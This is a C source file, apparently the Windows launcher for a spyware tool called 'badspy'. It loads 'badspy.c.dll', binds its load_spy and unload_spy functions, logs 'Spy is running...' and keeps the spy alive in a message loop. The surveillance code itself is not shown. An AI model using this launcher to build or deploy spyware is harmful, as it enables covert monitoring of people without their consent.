#include <stdio.h>
#include <windows.h>
#include "proc.h"
#include "main.h"
#include "../../log-cpp/log.h"
#include <Gdiplus.h>
#include <Shlwapi.h>
#define ERROR_CODE 1
#define OK_CODE 1

HMODULE badspyModule = NULL;
HMODULE badspyDllModule = NULL;

int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
	if (!init_library())
	{
		LOG_E("Can not load dll library");
		return ERROR_CODE;
	}

	if (!init_dll_func())
	{
		free_library();
		LOG_E("Can not bind dll functions");
		return ERROR_CODE;
	}
	
	if (load_spy())
	{
		free_library();
		LOG_E("Can not load spy!");
		return ERROR_CODE;
	}

	LOG_I("Spy is running...");

	start_looper();

	LOG_I("Spy is stopping...");

	unload_spy();

	return OK_CODE;
}

void start_looper()
{
	LOG("Start looper");
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	LOG("Stop looper");
}

bool init_library()
{
	LOG("Loading dll library");
	if ((badspyDllModule = LoadLibraryA("badspy.c.dll")) == NULL)
		return false;
	if ((badspyModule = GetModuleHandleA("badspy.c.dll")) == NULL)
		return false;
	LOG("Loaded dll library");
	return true;
}

bool init_dll_func()
{
	LOG("Loading dll functions");
	if ((load_spy = (LOAD_SPY)GetProcAddress(badspyModule, "load_spy")) == NULL)
		return false;
	if ((unload_spy = (UNLOAD_SPY)GetProcAddress(badspyModule, "unload_spy")) == NULL)
		return false;
	LOG("loaded dll functions");
	return true;
}

void free_library()
{
	LOG("Free dll library");
	if (badspyDllModule != NULL)
	{
		FreeLibrary(badspyDllModule);
		badspyDllModule = NULL;
	}
}